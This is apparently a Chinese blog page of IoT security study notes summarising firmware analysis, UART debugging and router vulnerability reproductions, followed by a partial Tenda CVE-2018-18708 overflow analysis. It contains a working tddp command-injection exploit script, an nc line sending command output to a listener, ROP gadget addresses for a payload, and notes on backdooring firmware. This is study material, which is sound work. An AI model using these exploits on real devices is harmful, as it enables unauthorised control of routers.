<li>常见的头部特征：sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz。</li>
<li>确定squashfs文件系统的大小：从 “hsqs”开始 dump 出一段数据（一般头部校验不超过100字节），file 命令查看</li>
</ul>
</li>
<li>拒绝服务：<ul>
<li>漏洞文件：upgradeStatusReboot.cgi中有reboot命令</li>
<li>如何触发：cgi文件伴随着http服务，找到web组件httpd，其调用路径：/etc/init.d/rcS、/etc/platformInit、sslvpnInit、httpd和httpkeepAlive.sh（前者的守护进程）</li>
<li>如何触发2：httpd在启动时会加载upgradeStatusReboot.cgi，且不需要授权就可访问（未授权访问是怎么体现的？启动时加载cgi就会被调用？）</li>
</ul>
</li>
<li>dsr-500<ul>
<li>thttpdInit：thttpd和httpkeepAlive.sh</li>
<li>kepler.config：定义了THHTP_CGI_PATTERN=”platfor.cgi|upgradeStatusReboot.cgi”</li>
<li>thttpd启动参数：thttpd -c THHTP_CGI_PATTERN，c指定了那些cgi文件（说明这些cgi可以未授权访问？）</li>
</ul>
</li>
<li><p>二者不同：250中httpd中加载了cgi文件，500中启动thttpd时参数指定了cgi</p>
</li>
<li><p>userInit 中，根据Country 设置安全等级，地区不同，漏洞触发点也不同</p>
</li>
</ul>
<h2 id="Linksys-EA6100-固件解密分析"><a href="#Linksys-EA6100-固件解密分析" class="headerlink" title="Linksys EA6100 固件解密分析"></a>Linksys EA6100 固件解密分析</h2><p><a href="https://www.anquanke.com/post/id/246659" target="_blank" rel="noopener">https://www.anquanke.com/post/id/246659</a></p>
<ul>
<li>概要：中间版本（未加密）可解密最新版本（加密）、gpg解密固件</li>
<li>从固件后缀名中获取信息<ul>
<li>以 “ .gpg.img” 为结尾的固件包，正常的固件包是以 “img”、“bin”、“chk” 为结尾</li>
<li>gpg：为文件生成签名、管理密钥以及验证签名的工具</li>
<li>固件可能是使用GPG生成的密钥进行加密的</li>
</ul>
</li>
<li>判定加密；熵值、binwalk、file</li>
<li>固件下载页面的提示<ul>
<li>更新最新固件的时候，需要先下载 Ver. 1.1.5 (Build 172244) 作为中间件</li>
<li>最新固件被加密，中间版本未加密（无gpg后缀）</li>
<li>中间版本用于提供密钥来解密最新的固件</li>
</ul>
</li>
<li>gpg密钥<ul>
<li>gpg参数k， -k, –list-keys            列出密钥</li>
<li>其它密钥保存格式：BEGIN RSA PRIVATE KEY私钥内容、BEGIN CERTIFICATE证书信息</li>
<li>搜索BEGIN RSA，找到密钥文件keydata</li>
</ul>
</li>
<li>gpg解密固件：import参数导入密钥、decrypt参数解密</li>
</ul>
<h2 id="NetGear-R7000P-路由器栈溢出漏洞硬件调试与分析"><a href="#NetGear-R7000P-路由器栈溢出漏洞硬件调试与分析" class="headerlink" title="NetGear R7000P 路由器栈溢出漏洞硬件调试与分析"></a>NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</h2><ul>
<li>概要：memcpy栈溢出、万用表识别uart、dslogic识别波特率、动态调试</li>
<li><p>确定uart</p>
<ul>
<li>gnd：指针wifi符号，黑色接地或任意金属，红色挨个试，听到声音便是（通导性测试）</li>
<li>vcc：指针20v，黑色接地，红色挨个试，出现最大电压值便是（若结果有两个，再与gnd相接，能重启便是）</li>
<li>tx/rx：指针20v，黑色接gnd，设备启动时，电压增大并保持不变是tx，电压为0是rx</li>
</ul>
</li>
<li><p>波特率3法：挨个试、python脚本、dslogic等硬件</p>
</li>
<li><p>dslogic使用</p>
<ul>
<li>接线：通道1接tx，黑色接gnd</li>
<li>pc上xcom软件模拟路由器</li>
<li>dslogic配套软件dsview</li>
<li>具体使用待学习</li>
</ul>
</li>
</ul>
<h2 id="一次嵌入式固件逆向实践"><a href="#一次嵌入式固件逆向实践" class="headerlink" title="一次嵌入式固件逆向实践"></a>一次嵌入式固件逆向实践</h2><ul>
<li>目录</li>
<li>ppc指令<ul>
<li>cmplwi-无符号立即数字比较：cmp-比较、l-无符号、w-word字、i-立即数、</li>
<li>slwi：slwi r0, r0, 8，即r0 = r0 &lt;&lt; 8，逻辑左移</li>
<li>addis：立即数左移16位后跟寄存器内容相加，s后缀表示左移16位</li>
</ul>
</li>
<li>法一：r11 = 0x70000+r3*4-0x4F0，即 jmp-基址+偏移 到跳转表，当r3为0即找第一个case</li>
<li>法二：最后一个跳转地址后面应该是第一个case语句跳转地址，即跳转表后紧跟着case代码块</li>
<li>sig库函数识别未实践过</li>
</ul>
<h2 id="DLink路由器固件的一次分析记录"><a href="#DLink路由器固件的一次分析记录" class="headerlink" title="DLink路由器固件的一次分析记录"></a>DLink路由器固件的一次分析记录</h2><ul>
<li>7z解压yyds</li>
<li>hnap基于http-soap，http协议中soapaction字段来表示不同的hnap请求，uri为/HNAP1</li>
<li>基础认证：请求头与环境变量的对应<ul>
<li>http请求中的基础认证，Authorization：Basic YWMEHZY+</li>
<li>环境变量中，http_hnap_auth = getenv(“HTTP_HNAP_AUTH”);</li>
</ul>
</li>
<li>过程：cgibin程序、hnap_handler、getenv、处理env_value、3处发生漏洞</li>
<li>C 库函数 char <em>strtok(char </em>str, const char *delim) 分解字符串 str, delim 为分隔符。<ul>
<li>该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</li>
<li>在第一次调用时，strtok()必需给予参数s 字符串，往后的调用则将参数s 设置成NULL<br>v22 = strtok(http_hnap_auth, “ “); # 第一次调用需给定s字符串<br>src = strtok(0, “ “); # 往后的调用s设置为null<br>假如原来为basic xxx,则第一次返回basic,第二次返回xxx</li>
</ul>
</li>
<li>atoi：atoi函数对于诸如此类的字符串:“12aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa”同样会成功的返回12</li>
</ul>
<h2 id="iot初体验-智能设备"><a href="#iot初体验-智能设备" class="headerlink" title="iot初体验-智能设备"></a>iot初体验-智能设备</h2><ul>
<li>思路：编程器连接flash获取固件、修改固件中uboot等待时间并刷回、uart连接并进入uboot</li>
<li>串口有两种标准，ttl和rs232，usb2ttl即将ttl的转为usb</li>
<li>那个xmc是flash，没有拆下来，直接接线连的编程器，提固件</li>
<li>识别出5个型号，不知道哪个就直接最后一个，猜？</li>
<li>固件内uboot（0-31000）挨着kernel（31000-）</li>
<li>不用非得dd提取出uboot再分析，直接拉入ida设置load size即可</li>
<li>判定基址时，差正好是20？怎么就判定是00那个而非20？（等作者解答，解答：jumptables中每个地址长度是4，103D0-103B0=0x20/4=8。，还是没懂）</li>
<li>怎么判断那个函数是等待时间的？仅凭文中代码不足以吧？</li>
</ul>
<h2 id="IoT设备固件分析教程之固件是怎么存储的"><a href="#IoT设备固件分析教程之固件是怎么存储的" class="headerlink" title="IoT设备固件分析教程之固件是怎么存储的"></a>IoT设备固件分析教程之固件是怎么存储的</h2><ul>
<li>名词：pcb-印刷电路板、soc片上系统</li>
<li>芯片识别：标签、封装/电路设计</li>
<li>nor与nand、emmc与ufs、</li>
<li>多种类型的存储器、不同类型的数据</li>
</ul>
<h2 id="记一次网关设备的pwn"><a href="#记一次网关设备的pwn" class="headerlink" title="记一次网关设备的pwn"></a>记一次网关设备的pwn</h2><ul>
<li>整体讲的比较粗，对新手不友好：模拟、exp、获取imagebase都没有详细步骤，等回头再来</li>
<li>修改html标签属性就能打开telnet？</li>
<li>mips流水线效应，jalr后的mov a2,s0优先执行</li>
<li>mips返回地址，$ra，return address（截图中没显示）</li>
<li>没必要非从理论上说明会栈溢出，直接调试跑一波即可验证（如果从理论上讲，sscanf导致从v4到a2，a2是参数，按照x86的参返旧局，参数被覆盖后并不会覆盖到返回地址，何况在此还不清楚mips函数调用时栈到底怎么排布）</li>
<li>exp怎么构造的？没细讲，也许是一边调试一边构造的，硬看不好理解</li>
<li>imagebase查看？：ida下断main、qemu的strace参数，没懂</li>
</ul>
<h2 id="2018-年-IoT-那些事儿"><a href="#2018-年-IoT-那些事儿" class="headerlink" title="2018 年 IoT 那些事儿"></a>2018 年 IoT 那些事儿</h2><ul>
<li>概述：非技术文章、详见原文目录</li>
<li><p>现状</p>
<ul>
<li>IoT 设备会越来越多，IoT 恶意样本数量爆炸式增长</li>
<li>被攻击后的设备，通常会进入黑客的武器库。</li>
<li>蠕虫感染或者自主的批量攻击来控制批量目标设备，构建僵尸网络</li>
<li>路由器、摄像头和智能电视被攻击频率最高</li>
</ul>
</li>
<li><p>IoT 攻击源</p>
<ul>
<li>欧美：IoT 恶意代码控制服务器的家乡</li>
<li>中国： IoT 攻击活动最频发的国家，也是最大的受害国</li>
<li>国内 ：与 GDP有关联性</li>
</ul>
</li>
<li><p>DDoS是IoT 恶意软件的主流功能，受青睐的四个原因：</p>
<ul>
<li>几何级数暴增</li>
<li>跨多平台传播</li>
<li>TB 级流量攻击</li>
<li>慢速 CC 攻击</li>
</ul>
</li>
<li><p>攻击方式：</p>
<ul>
<li>利用服务器进行集中式扫描攻击，并向 IoT 设备植入恶意软件</li>
<li>通过蠕虫传播攻击，如弱口令和漏洞利用</li>
</ul>
</li>
<li><p>IoT 安全趋势：</p>
<ul>
<li>针对 IoT 设备的攻击量将远远超过其他攻击目标</li>
<li>传统安全的防御形式被打破，迫使安全厂商思考新的防御思路</li>
<li>被攻击 IoT 的设备将呈现多样化</li>
<li>IoT 设备将成为恶意挖矿软件和勒索软件的下一个目标</li>
<li>攻击将越来越专业化，政治目的的攻击变多</li>
</ul>
</li>
<li><p>防护建议</p>
<ul>
<li>个人用户：修改默认密码、更新固件、不将端口向互联网开放</li>
<li>IoT 厂商：安全启动（通过证书来验证程序）、及时打补丁、云端服务器安全（数据和服务）、加密实现数据安全、动态密钥而非硬编码</li>
</ul>
</li>
</ul>
<h2 id="由一道工控路由器固件逆向题目看命令执行漏洞"><a href="#由一道工控路由器固件逆向题目看命令执行漏洞" class="headerlink" title="由一道工控路由器固件逆向题目看命令执行漏洞"></a>由一道工控路由器固件逆向题目看命令执行漏洞</h2><p><a href="https://www.anquanke.com/post/id/183202" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183202</a></p>
<ul>
<li>处理 tddp 协议的二进制文件：usr/bin/tddp、UDP的1040 端口</li>
<li><p>漏洞点：</p>
<ul>
<li>switch-case的 0x31分支，即 <code>CMD_FTEST_CONFIG</code> </li>
<li>sscanf 函数解析后，拼接到 run_exec 函数，过滤不严，只判断了 ; 字符，没有过滤 &amp; 和 | </li>
<li>run_exec 函数，调用了 execve 进行命令执行</li>
<li>回溯输入点：recvfrom 函数接收 socket 数据</li>
</ul>
</li>
<li><p>根据代码，构造出结构体空间布局</p>
</li>
<li><p>nmap 的 UDP 扫描，1040是开放的，TCP 扫描则端口是关闭的</p>
</li>
<li><p>exp</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">recv_port = <span class="number">12345</span></span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)<span class="comment"># UDP 的 socket</span></span><br><span class="line">s_recv = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s_recv.bind((<span class="string">''</span>,<span class="number">12345</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'x01x31'</span>.ljust(<span class="number">12</span>,<span class="string">'x00'</span>) <span class="comment"># 前两个字节\0x1\0x31，中间要填充 10，原因是v21指针会后移 12 位</span></span><br><span class="line">payload+= <span class="string">"123|%s&amp;&amp;echo ;123"</span>%(command)<span class="comment"># ;后还要填充字符，因为sscanf后,会判断 ; 后面的内容是否为空</span></span><br><span class="line"></span><br><span class="line">s_send.sendto(payload,(ip,tddp_port))</span><br><span class="line">s_send.close()</span><br><span class="line"></span><br><span class="line">res,addr = s_recv.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
<ul>
<li><p>命令执行回显结果</p>
<ul>
<li><p>telnetd：能够连接上，但执行命令失败，因为远程没有用于 telnet 服务的终端</p>
</li>
<li><p>nc：尝试用 nc 来弹shell ，但nc被阉割</p>
</li>
<li>nc：将命令的内容正向连接来输出，本地监听nc -nvlp 6666，命令为”uname|nc ip 6666”，执行结果就会显示在本地</li>
</ul>
</li>
<li><p>另一个洞：注入一个合法的 lua 脚本，让程序去访问也可执行命令</p>
</li>
</ul>
<h2 id="强网杯2020决赛-ciscoRV110W-web服务漏洞复现"><a href="#强网杯2020决赛-ciscoRV110W-web服务漏洞复现" class="headerlink" title="强网杯2020决赛 ciscoRV110W web服务漏洞复现"></a>强网杯2020决赛 ciscoRV110W web服务漏洞复现</h2><ul>
<li>确定目标程序：grep字符串（配置页面的url即/login.cgi）、netstat看443端口对应进程，再find找出差呢刚需</li>
<li>漏洞对比找到sscanf</li>
<li>分析程序，找到漏洞触发的请求，远程调试确定偏移</li>
<li>ret2libc+shellcode：msfvenom生成shellcode、利用多线程同一个脚本中攻击及接受反弹shell</li>
</ul>
<h2 id="路由器篡改固件添加后门"><a href="#路由器篡改固件添加后门" class="headerlink" title="路由器篡改固件添加后门"></a>路由器篡改固件添加后门</h2><ul>
<li>目录</li>
<li>bindshell后门</li>
<li>其他均常规操作，平平无奇</li>
</ul>
<h2 id="通过设备UART接口调试获取shell"><a href="#通过设备UART接口调试获取shell" class="headerlink" title="通过设备UART接口调试获取shell"></a>通过设备UART接口调试获取shell</h2><ul>
<li>目录</li>
<li>uart识别未实践过、芯片查询网站</li>
<li>揭秘一书中：<ul>
<li>目测法（vcc方形、gnd多条线）</li>
<li>测试法（vcc电压稳定、gnd电阻为0、txd电压下降、rxd排除法</li>
</ul>
</li>
</ul>
<h2 id="IoT漏洞研究（一）固件基础"><a href="#IoT漏洞研究（一）固件基础" class="headerlink" title="IoT漏洞研究（一）固件基础"></a>IoT漏洞研究（一）固件基础</h2><ul>
<li>IOT固件分两类<ul>
<li>存在文件系统，基于linux/BSD</li>
<li>固件是一个整体，即RTOS，Real-time operating system</li>
</ul>
</li>
<li><p>存在文件系统</p>
<ul>
<li>UBI</li>
<li>PFS</li>
<li>Openwrt Lua</li>
</ul>
</li>
<li><p>RTOS</p>
<ul>
<li>固件本身就是一个可执行文件，不存在文件系统，启动后直接加载运行</li>
<li>RTOS的分析最重要两点：程序入口、 程序符号</li>
<li>vxworks</li>
<li>U-boot</li>
<li>Chip firmware</li>
</ul>
</li>
<li>Chip firmware<ul>
<li>有些IOT固件没有资料，逆向困难，需要对固件整体分析</li>
<li>0x100的位置：都是0x2xxxxx，既非代码也非数据，推测是地址，即此处是地址表</li>
<li>猜测基址为0x200000，rebase后，识别出许多类似函数名的字符串</li>
<li>搜索字符串地址，固件中找到，结合基址找到在IDA中位置，即字符串表</li>
<li>如上，地址表，字符串表都是重要线索</li>
</ul>
</li>
<li>未完待续</li>
</ul>
<h2 id="僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现"><a href="#僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现" class="headerlink" title="僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现"></a>僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现</h2><ul>
<li>sprintf+system命令注入</li>
<li>分号拼接命令</li>
<li>cmd溯源到用户输入</li>
<li>源追溯，依据printf函数，判定为uri</li>
</ul>
<h2 id="复现影响79款Netgear路由器高危漏洞"><a href="#复现影响79款Netgear路由器高危漏洞" class="headerlink" title="复现影响79款Netgear路由器高危漏洞"></a>复现影响79款Netgear路由器高危漏洞</h2><ul>
<li>概述：栈溢出、串口连接、00绕strcmp、rop链</li>
<li>串口连接：<ul>
<li>Hyper Terminal软件、TTL转USB转接板</li>
<li>一般情况：1-连接杜邦线-router、2-连接USB-pc、3-打开Hyper Terminal、4-开启路由器、5-Hyper Terminal显示数据</li>
<li>有时会获取不到信息，故先usb再杜邦线-先2后1，有类似的坑</li>
</ul>
</li>
<li>exp<ul>
<li>strcmp(src,”*#</li>
<li>函数返回：pop {R4-R11, PC}</li>
<li>栈布局：a、b、c</li>
<li>ROP：MOV R0,SP; BL system</li>
<li>a给R4-R11、b给PC、pop完ab后，SP执行c，即system的R0即cmd</li>
</ul>
</li>
<li>ROP<ul>
<li>优先本程序，其次libc</li>
<li>找MOV R0,SP类似的rop</li>
<li>1：栈布局+函数返回，能控制sp指向cmd</li>
<li>2：sp赋值r0，作为system参数</li>
</ul>
</li>
</ul>
<h2 id="复现｜路由器命令执行"><a href="#复现｜路由器命令执行" class="headerlink" title="复现｜路由器命令执行"></a>复现｜路由器命令执行</h2><ul>
<li>模拟，过程很完整，ssh连接了qemu，多个终端，一个起进程，另一个可ps等</li>
<li>分析，通过端口找进程，4种方法见另篇文章</li>
<li>扩展，内网扩大到外网，利用csrf</li>
</ul>
<h2 id="复现｜摄像头固件重打包"><a href="#复现｜摄像头固件重打包" class="headerlink" title="复现｜摄像头固件重打包"></a>复现｜摄像头固件重打包</h2><ul>
<li>思路很清晰，看目录</li>
<li>docker版qemu</li>
<li>重要的是固件上传的校验及绕过（校验的是uimage，即uboot</li>
<li>自己编译一个后门程序，还有利用现成的，如utelnet等</li>
<li>固件重打包：mksquashfs、mkimage、还注意加载基址和入口点</li>
</ul>
<h2 id="漏洞组合拳劫持门禁控制系统"><a href="#漏洞组合拳劫持门禁控制系统" class="headerlink" title="漏洞组合拳劫持门禁控制系统"></a>漏洞组合拳劫持门禁控制系统</h2><ul>
<li>认证绕过<ul>
<li>cookie文件目录遍历+未认证文件上传</li>
<li>通过 cookie进行认证，http中cookie对应服务端上的cookie文件</li>
<li>文件上传功能不需要认证，可伪造一个cookie文件上传</li>
<li>目录遍历找到上传的伪造cookie文件，即可通过认证</li>
</ul>
</li>
<li>持久化后门<ul>
<li>文件上传 + 命令注入（二者都需认证绕过）</li>
<li>可上传用户照片，仅限制图片后缀，并没检查文件内容</li>
<li>设置ntp服务器，存在命令注入，但长度受限</li>
<li>构造恶意脚本、上传脚本、注入点执行脚本</li>
<li>后门：交互式（有回显）的命令执行，类似shell。恶意脚本在cookie中放置待执行命令</li>
<li>持久化：每次开机都会执行，不能断电失效，如tmp目录。配置ntp后重启生效，在启动时会解析配置</li>
</ul>
</li>
<li>漏洞利用链<ul>
<li>共4个漏洞，前2组合成认证绕过，全部组合成持久化后门</li>
<li>目录遍历实现数据读取，文件上传实现数据写入</li>
<li>别轻视低危漏洞，找到读写原语，实现组合漏洞</li>
</ul>
</li>
</ul>
<h2 id="Flash-Dump技术解析"><a href="#Flash-Dump技术解析" class="headerlink" title="Flash Dump技术解析"></a>Flash Dump技术解析</h2><ul>
<li>思路清晰，见目录</li>
<li>flash中的固件一般不加密，且从flash中提取法比较通用</li>
<li>拆卸、焊接、读取的硬件工具</li>
<li>基于统计法修复数据、nand会有ecc校验位</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/06/11/iot/Tenda溢出漏洞-CVE-2018-18708分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/11/iot/Tenda溢出漏洞-CVE-2018-18708分析/" class="post-title-link" itemprop="url">Tenda溢出漏洞-CVE-2018-18708分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-11 09:23:44" itemprop="dateCreated datePublished" datetime="2021-06-11T09:23:44+08:00">2021-06-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 17:10:28" itemprop="dateModified" datetime="2022-02-21T17:10:28+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h2 id="Tenda溢出漏洞-CVE-2018-18708分析"><a href="#Tenda溢出漏洞-CVE-2018-18708分析" class="headerlink" title="Tenda溢出漏洞-CVE-2018-18708分析"></a>Tenda溢出漏洞-CVE-2018-18708分析</h2><ul>
<li>识别main</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int start()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> ((int (__fastcall *)(int (__fastcall *)(int, int)))_uClibc_main)(sub_2E420);</span><br><span class="line">&#125;</span><br><span class="line">int __fastcall sub_2E420(int a1, int a2)</span><br><span class="line"><span class="comment"># rename为main后，2参转为3参</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br></pre></td></tr></table></figure>
<ul>
<li>判断函数功能：get_data_from_http</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过多处的调用</span></span><br><span class="line"><span class="comment"># 字符串应该是http请求中各参数</span></span><br><span class="line"><span class="comment"># 判定为：从http请求中获取相应数据，rename为get_data_from_http</span></span><br><span class="line">v17 = sub_2BA8C(a1, <span class="string">"deviceList"</span>, &amp;unk_F5124);</span><br><span class="line">v9 = sub_2BA8C(a1, <span class="string">"user"</span>, &amp;unk_DB2A0);</span><br><span class="line">s1 = sub_2BA8C(a1, <span class="string">"password"</span>, &amp;unk_DB2A0);</span><br><span class="line">s2 = sub_2BA8C(a1, <span class="string">"passconf"</span>, &amp;unk_DB2A0);</span><br><span class="line">v6 = sub_2BA8C(a1, <span class="string">"group"</span>, &amp;unk_DB2A0);</span><br><span class="line">v5 = sub_2BA8C(a1, <span class="string">"enabled"</span>, &amp;unk_DB2A0);</span><br><span class="line">v4 = sub_2BA8C(a1, <span class="string">"ok"</span>, &amp;unk_DB2A0);</span><br><span class="line"></span><br><span class="line">v4 = sub_2BA8C(a1, <span class="string">"user"</span>, &amp;unk_DB2A0);</span><br><span class="line">v3 = sub_2BA8C(a1, <span class="string">"ok"</span>, &amp;unk_DB2A0);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>确定调用链中的分支跳转</p>
<ul>
<li><p>aaa_Handle_net调用vuln6：IDA反编译视图，可直接确定有无分支</p>
</li>
<li><p>6调用5：若有分支，qemu -g 1234、IDA中gdb远程调试，动态确定（如Vuln6到Vuln5有一个if，if和调用Vuln5处均下断，F9可从if直接跑到Vuln5，说明有分支判断，但已经满足</p>
</li>
<li><p><strong><em>5调用4：Vuln5是否会调用vuln_4_formSetMacfiltercfg？他所讲不知云云，按上述静态分析得知无分支，动态调试时运行到此时，  ，就会卡住，等一会报错，why？这个被执行了吗？暂且搁置</em></strong></p>
</li>
<li><p>4调用3：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-13-033031.jpg" alt="image-20200513111459808"></p>
</li>
<li><p>3调用2，2调用Vuln：由反编译窗口可见都会成立</p>
</li>
<li><p>Vuln：检测a1（一直追溯就是deviceList）是否包含’r’，随后进入分支，执行strpcy触发溢出</p>
</li>
</ul>
</li>
<li><p>逆向追踪数据流：</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命名规则：my_vulnee、my_vulner、my_caller1、my_caller2、、、</span></span><br><span class="line">my_caller5_main</span><br><span class="line">my_caller4</span><br><span class="line">my_caller3</span><br><span class="line">my_caller2_formSetMacFilterCfg000</span><br><span class="line">my_caller1</span><br><span class="line">my_vulner</span><br><span class="line">my_vulnee</span><br></pre></td></tr></table></figure>
<ul>
<li>查看分支跳转时：右键group nodes折叠块</li>
<li>uri与相应的函数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 并非只加/，还需其他路径</span></span><br><span class="line">int my_caller3()</span><br><span class="line">&#123;</span><br><span class="line">  sub_10120(<span class="string">"TendaGetLongString"</span>, aspTendaGetLongString);</span><br><span class="line">  sub_10120(<span class="string">"aspTendaGetStatus"</span>, aspTendaGetStatus);</span><br><span class="line">  sub_171EC(<span class="string">"setMacFilterCfg"</span>, my_caller2_formSetMacFilterCfg);</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 发现文件及其内容</span></span><br><span class="line">webroot_ro/goform/setMacFilterCfg.txt</span><br><span class="line">&#123;<span class="string">"errCode"</span>:<span class="string">"0"</span>&#125;<span class="comment"># 内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单测试后，形式：IP/goform/setMacFilterCfg</span></span><br></pre></td></tr></table></figure>
<ul>
<li>溢出时的缓冲区不一定是在本函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 缓冲区来自参数2</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">my_vulnee</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *deviceList, <span class="keyword">char</span> *buff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff + <span class="number">32</span>, deviceList);              <span class="comment">// overflow!</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buff, mac);</span><br><span class="line"><span class="comment">// 最终来自调用者</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">my_vulner</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *macFilterType, <span class="keyword">const</span> <span class="keyword">char</span> *deviceList, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buff[<span class="number">176</span>]; <span class="comment">// [sp+14Ch] [bp-B0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="number">0xA0</span>u);</span><br><span class="line">  my_vulnee(deviceList, buff);                  <span class="comment">// from a2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>CPSR寄存器的T位：右数第6</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里记得检查下CPSR寄存器的T位，因为栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。如果T位值为1，需要在地址上加一还原</span></span><br><span class="line">pc原来的lsb为0，则T为0，此时不变</span><br><span class="line">原来的lsb为1，则t为1，相当于-1</span><br></pre></td></tr></table></figure>
<ul>
<li>构造exp<ul>
<li>libc基址：0xf6592000（vmmap</li>
<li>system函数地址：0005a270（readelf + grep</li>
<li>0x00040cb8 : mov r0, sp ; blx r3、（ROPgadget</li>
<li>0x00018298 : pop {r3, pc}</li>
<li>注意：libc基址、IP地址、少了的反斜杠</li>
</ul>
</li>
<li>最终payload格式为：[offset, gadget1, system_addr, gadget2, cmd] ，流程如下：<ul>
<li>溢出处函数返回跳转到第一个gadget1（pop {r3, pc}）；</li>
